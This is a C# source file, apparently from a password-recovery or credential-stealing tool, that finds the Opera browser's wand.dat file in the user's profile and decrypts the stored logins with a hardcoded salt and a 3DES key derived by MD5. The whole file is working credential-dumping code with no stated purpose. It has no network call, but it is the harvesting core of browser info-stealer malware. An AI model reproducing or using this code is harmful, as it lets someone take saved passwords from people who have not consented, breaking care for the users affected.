using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security;
using System.Text;
using System.Threading.Tasks;
using Microsoft.VisualBasic;

public class OperaPasswords
{
    public static IEnumerable<OperaPassword> EnumeratePasswords()
    {
        string operaLess10 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Opera\Opera9\profile\wand.dat");
        string opera10Above = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Opera\Opera\wand.dat");

        List<OperaPassword> ret = new List<OperaPassword>();
        ret.AddRange(EnumeratePasswords(operaLess10));
        ret.AddRange(EnumeratePasswords(opera10Above));
        return ret;
    }

    private static IEnumerable<OperaPassword> EnumeratePasswords(string wandFileName)
    {
        List<OperaPassword> ret = new List<OperaPassword>();
        if (!File.Exists(wandFileName))
            return ret;
        using (FileStream fs = new FileStream(wandFileName, FileMode.Open, FileAccess.Read))
        {
            List<EncBlock> blks = new List<EncBlock>();
            fs.Seek(0, SeekOrigin.Begin);
            while (fs.Position != fs.Length)
            {
                EncBlock b = ReadEncryptedBlock(fs);
                if (b != null)
                    blks.Add(b);
            }

            fs.Seek(0, SeekOrigin.Begin);
            System.IO.BinaryReader s = new System.IO.BinaryReader(fs);
            int version = Swap(s.ReadInt32());
            switch (version)
            {
                case object _ when version < 5:
                    {
                        for (int i = 4; i <= blks.Count - ((blks.Count - 4) % 5) - 1; i += 5)
                            ret.Add(new OperaPassword(blks[i].DataString, string.Empty, blks[i + 1].DataString, blks[i + 2].DataString, blks[i + 3].DataString, blks[i + 4].DataString, string.Empty));
                        break;
                    }

                case 5:
                    {
                        for (int i = 4; i <= blks.Count - ((blks.Count - 4) % 6) - 1; i += 6)
                            ret.Add(new OperaPassword(blks[i].DataString, blks[i + 1].DataString, blks[i + 2].DataString, blks[i + 3].DataString, blks[i + 4].DataString, blks[i + 5].DataString, string.Empty));
                        break;
                    }

                default:
                    {
                        int startIdx = 5;
                        while (startIdx < blks.Count)
                        {
                            int endIdx = startIdx + 1;
                            while (endIdx < blks.Count)
                            {
                                if (System.Text.RegularExpressions.Regex.IsMatch(blks[endIdx].DataString, "^[0-9A-F]{32}"))
                                    break;
                                endIdx += 1;
                            }
                            if (endIdx - startIdx == 10)
                                ret.Add(new OperaPassword(blks[endIdx - 7].DataString, blks[startIdx + 2].DataString, blks[endIdx - 6].DataString, blks[endIdx - 5].DataString, blks[endIdx - 4].DataString, blks[endIdx - 3].DataString, blks[startIdx + 1].DataString));
                            else
                                ret.Add(new OperaPassword(blks[endIdx - 5].DataString, blks[startIdx + 2].DataString, blks[endIdx - 4].DataString, blks[endIdx - 3].DataString, blks[endIdx - 2].DataString, blks[endIdx - 1].DataString, blks[startIdx + 1].DataString));
                            startIdx = endIdx;
                        }

                        break;
                    }
            }
        }
        return ret;
    }

    private class EncBlock
    {
        public int BlockSize;
        public int DESKeyLength;
        public byte[] DESKey;
        public int DataLength;
        public byte[] Data;
        public string DataString;

        public override string ToString()
        {
            return this.DataString;
        }
    }
    private static int Swap(int i)
    {
        return System.Convert.ToInt32(((i & 0xFF) >> 0) << 24) + System.Convert.ToInt32(((i & 0xFF00) >> 8) << 16) + System.Convert.ToInt32(((i & 0xFF0000) >> 16) << 8) + System.Convert.ToInt32(((i & 0xFF000000) >> 24) << 0);
    }
    private static EncBlock ReadEncryptedBlock(Stream stream)
    {
        EncBlock enc = new EncBlock();

    retry:
        ;
        while (stream.Position != stream.Length)
        {
            if (stream.ReadByte() == 0)
            {
                if (stream.ReadByte() == 0)
                {
                    if (stream.ReadByte() == 0)
                    {
                        if (stream.ReadByte() == 8)
                            break;
                    }
                }
            }
        }

        if (stream.Position == stream.Length)
            return null;

        long pos = stream.Seek(-8, SeekOrigin.Current) + 8;

        System.IO.BinaryReader s = new System.IO.BinaryReader(stream);
        enc.BlockSize = Swap(s.ReadInt32());
        enc.DESKeyLength = Swap(s.ReadInt32());
        enc.DESKey = s.ReadBytes(8);
        enc.DataLength = Swap(s.ReadInt32());
        if (enc.DataLength + 0x10 != enc.BlockSize)
        {
            stream.Seek(pos, SeekOrigin.Begin);
            goto retry;
        }
        enc.Data = s.ReadBytes(enc.DataLength);

        byte[] salt = new byte[] { 0x83, 0x7D, 0xF, 0xF, 0x8E, 0xB3, 0xE8, 0x69, 0x73, 0xAF, 0xFF };

        byte[] buffer = new byte[256];
        Array.Copy(salt, buffer, salt.Length);
        Array.ConstrainedCopy(enc.DESKey, 0, buffer, salt.Length, enc.DESKey.Length);

        System.Security.Cryptography.MD5CryptoServiceProvider md5 = new System.Security.Cryptography.MD5CryptoServiceProvider();
        byte[] md5hash1 = md5.ComputeHash(buffer, 0, salt.Length + enc.DESKey.Length);

        Array.Copy(md5hash1, buffer, md5hash1.Length);
        Array.ConstrainedCopy(salt, 0, buffer, md5hash1.Length, salt.Length);
        Array.ConstrainedCopy(enc.DESKey, 0, buffer, md5hash1.Length + salt.Length, enc.DESKey.Length);

        byte[] md5hash2 = md5.ComputeHash(buffer, 0, md5hash1.Length + salt.Length + enc.DESKey.Length);

        byte[] key = new byte[24];
        Array.ConstrainedCopy(md5hash1, 0, key, 0, 8);
        Array.ConstrainedCopy(md5hash1, 8, key, 8, 8);
        Array.ConstrainedCopy(md5hash2, 0, key, 16, 8);
        byte[] iv = new byte[8];
        Array.ConstrainedCopy(md5hash2, 8, iv, 0, 8);

        System.Security.Cryptography.TripleDESCryptoServiceProvider tes = new System.Security.Cryptography.TripleDESCryptoServiceProvider();
        System.Security.Cryptography.ICryptoTransform dec = tes.CreateDecryptor(key, iv);
        System.Security.Cryptography.CryptoStream cs = new System.Security.Cryptography.CryptoStream(new MemoryStream(enc.Data), dec, System.Security.Cryptography.CryptoStreamMode.Read);
        MemoryStream @out = new MemoryStream();
        byte[] buf = new byte[256];
        int ret = cs.Read(buf, 0, buf.Length);
        while (ret != 0)
        {
            @out.Write(buf, 0, ret);
            ret = cs.Read(buf, 0, buf.Length);
        }

        enc.DataString = System.Text.Encoding.Unicode.GetString(@out.ToArray());

        return enc;
    }
}
